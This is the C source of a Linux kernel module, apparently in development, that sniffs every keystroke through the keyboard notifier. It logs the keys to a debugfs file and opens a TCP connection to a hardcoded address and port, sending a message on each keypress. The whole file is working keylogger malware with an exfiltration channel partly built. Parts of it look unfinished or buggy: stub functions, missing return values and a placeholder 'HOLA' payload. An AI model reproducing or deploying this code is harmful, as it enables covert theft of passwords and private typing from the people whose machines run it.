#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/socket.h>
#include <linux/slab.h>

#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12			 /* Encoded 'keycode shift' chunk length */
#define US 0					 /* Type code for US character log */
#define HEX 1					 /* Type code for hexadecimal log */
#define DEC 2					 /* Type code for decimal log */

#define PORT 2325
struct socket *conn_socket = NULL;

static int codes; /* Log type module parameter */

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Alexey Kapustin");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");

module_param(codes, int, 0644);
MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

/* Declarations */
static struct dentry *file;
static struct dentry *subdir;

static ssize_t keys_read(struct file *filp,
						 char *buffer,
						 size_t len,
						 loff_t *offset);

static int keysniffer_cb(struct notifier_block *nblock,
						 unsigned long code,
						 void *_param);

/* Definitions */

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, //0-3
	{"3", "#"},
	{"4", "$"},
	{"5", "%"},
	{"6", "^"}, //4-7
	{"7", "&"},
	{"8", "*"},
	{"9", "("},
	{"0", ")"}, //8-11
	{"-", "_"},
	{"=", "+"},
	{"_BACKSPACE_", "_BACKSPACE_"}, //12-14
	{"_TAB_", "_TAB_"},
	{"q", "Q"},
	{"w", "W"},
	{"e", "E"},
	{"r", "R"},
	{"t", "T"},
	{"y", "Y"},
	{"u", "U"},
	{"i", "I"}, //20-23
	{"o", "O"},
	{"p", "P"},
	{"[", "{"},
	{"]", "}"}, //24-27
	{"_ENTER_", "_ENTER_"},
	{"_CTRL_", "_CTRL_"},
	{"a", "A"},
	{"s", "S"},
	{"d", "D"},
	{"f", "F"},
	{"g", "G"},
	{"h", "H"}, //32-35
	{"j", "J"},
	{"k", "K"},
	{"l", "L"},
	{";", ":"}, //36-39
	{"'", "\""},
	{"`", "~"},
	{"_SHIFT_", "_SHIFT_"},
	{"\\", "|"}, //40-43
	{"z", "Z"},
	{"x", "X"},
	{"c", "C"},
	{"v", "V"}, //44-47
	{"b", "B"},
	{"n", "N"},
	{"m", "M"},
	{",", "<"}, //48-51
	{".", ">"},
	{"/", "?"},
	{"_SHIFT_", "_SHIFT_"},
	{"_PRTSCR_", "_KPD*_"},
	{"_ALT_", "_ALT_"},
	{" ", " "},
	{"_CAPS_", "_CAPS_"},
	{"F1", "F1"},
	{"F2", "F2"},
	{"F3", "F3"},
	{"F4", "F4"},
	{"F5", "F5"}, //60-63
	{"F6", "F6"},
	{"F7", "F7"},
	{"F8", "F8"},
	{"F9", "F9"}, //64-67
	{"F10", "F10"},
	{"_NUM_", "_NUM_"},
	{"_SCROLL_", "_SCROLL_"}, //68-70
	{"_KPD7_", "_HOME_"},
	{"_KPD8_", "_UP_"},
	{"_KPD9_", "_PGUP_"}, //71-73
	{"-", "-"},
	{"_KPD4_", "_LEFT_"},
	{"_KPD5_", "_KPD5_"}, //74-76
	{"_KPD6_", "_RIGHT_"},
	{"+", "+"},
	{"_KPD1_", "_END_"}, //77-79
	{"_KPD2_", "_DOWN_"},
	{"_KPD3_", "_PGDN"},
	{"_KPD0_", "_INS_"}, //80-82
	{"_KPD._", "_DEL_"},
	{"_SYSRQ_", "_SYSRQ_"},
	{"\0", "\0"}, //83-85
	{"\0", "\0"},
	{"F11", "F11"},
	{"F12", "F12"},
	{"\0", "\0"}, //86-89
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"_ENTER_", "_ENTER_"},
	{"_CTRL_", "_CTRL_"},
	{"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"},
	{"_ALT_", "_ALT_"},
	{"\0", "\0"}, //99-101
	{"_HOME_", "_HOME_"},
	{"_UP_", "_UP_"},
	{"_PGUP_", "_PGUP_"}, //102-104
	{"_LEFT_", "_LEFT_"},
	{"_RIGHT_", "_RIGHT_"},
	{"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"},
	{"_PGDN", "_PGDN"},
	{"_INS_", "_INS_"}, //108-110
	{"_DEL_", "_DEL_"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"}, //111-114
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},			//115-118
	{"_PAUSE_", "_PAUSE_"}, //119
};

static size_t buf_pos;
static char keys_buf[BUF_LEN] = {0};

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

u32 create_address(u8 *ip)
{
	u32 addr = 0;
	int i;

	for (i = 0; i < 4; i++)
	{
		addr += ip[i];
		if (i == 3)
			break;
		addr <<= 8;
	}
	return addr;
}

static ssize_t keys_read(struct file *filp,
						 char *buffer,
						 size_t len,
						 loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block keysniffer_blk = {
	.notifier_call = keysniffer_cb,
};

void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
{
	switch (type)
	{
	case US:
		if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
		{
			const char *us_key = (shift_mask == 1)
									 ? us_keymap[keycode][1]
									 : us_keymap[keycode][0];

			snprintf(buf, CHUNK_LEN, "%s", us_key);
		}
		break;
	case HEX:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%x %x", keycode, shift_mask);
		break;
	case DEC:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%d %d", keycode, shift_mask);
		break;
	}
}

int sendKeyPress(int sock, int code)
{
	printk("I sent testmsg!____________\n");
}
int tcp_client_send(struct socket *sock, const char *buf, const size_t length,
					unsigned long flags)
{
	struct msghdr msg;
	//struct iovec iov;
	struct kvec vec;
	int len, written = 0, left = length;
	mm_segment_t oldmm;

	msg.msg_name = 0;
	msg.msg_namelen = 0;
	/*
msg.msg_iov     = &iov;
msg.msg_iovlen  = 1;
*/
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = flags;

	oldmm = get_fs();
	set_fs(KERNEL_DS);
repeat_send:

	vec.iov_len = left;
	vec.iov_base = (char *)buf + written;

	len = kernel_sendmsg(sock, &msg, &vec, 1, left);
	
	if ((len == -ERESTARTSYS) || (!(flags & MSG_DONTWAIT) &&
								  (len == -EAGAIN)))
		goto repeat_send;
	printk("LEN32____%d\n", len);

	if (len > 0)
	{
		written += len;
		left -= len;
		if (left)
			goto repeat_send;
	}
	set_fs(oldmm);
	printk("LEN____%d\n", len);
	return written ? written : len;
}

int tcp_client_connect(void)
{
	unsigned char destip[5] = {10, 129, 41, 200, '\0'};

	int ret = -1;

	ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
	if (ret < 0)
	{
		printk("error socket create");
	}

	struct sockaddr_in saddr; /* a socket address */

	saddr.sin_family = AF_INET;   /* for internet */
	saddr.sin_port = htons(PORT); /* using the port PORT */
	saddr.sin_addr.s_addr = htonl(create_address(destip));
	ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&saddr, sizeof(saddr), O_RDWR);
	if (ret && (ret != -EINPROGRESS))
	{
		printk("error socket create2");
	}
}
/* Keypress callback */
int keysniffer_cb(struct notifier_block *nblock,
				  unsigned long code,
				  void *_param)
{
	char keybuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *param = _param;

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
			 code, param->down, param->shift, param->value);

	if (!(param->down))
		return NOTIFY_OK;
	sendKeyPress(222, code);
	int len = 49;
	char reply[len + 1];

	memset(&reply, 0, len + 1); /* sets 0s into all the string space */
	strcat(reply, "HOLA");		/* sets the message */

	tcp_client_send(conn_socket, reply, strlen(reply), MSG_DONTWAIT);
	keycode_to_string(param->value, param->shift, keybuf, codes);
	len = strlen(keybuf);

	if (len < 1)
		return NOTIFY_OK;

	if ((buf_pos + len) >= BUF_LEN)
	{
		memset(keys_buf, 0, BUF_LEN);
		buf_pos = 0;
	}

	strncpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;
	keys_buf[buf_pos++] = '\n';
	pr_debug("%s\n", keybuf);

	return NOTIFY_OK;
}

static int __init keysniffer_init(void)
{
	int error, ret;
	buf_pos = 0;

	if (codes < 0 || codes > 2)
		return -EINVAL;

	subdir = debugfs_create_dir("keylog", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
	if (!file)
	{
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	register_keyboard_notifier(&keysniffer_blk);
	tcp_client_connect();
}

static void __exit keysniffer_exit(void)
{
	unregister_keyboard_notifier(&keysniffer_blk);
	debugfs_remove_recursive(subdir);
	if (conn_socket != NULL)
	{
		/* relase the socket */
		sock_release(conn_socket);
	}
}

module_init(keysniffer_init);
module_exit(keysniffer_exit);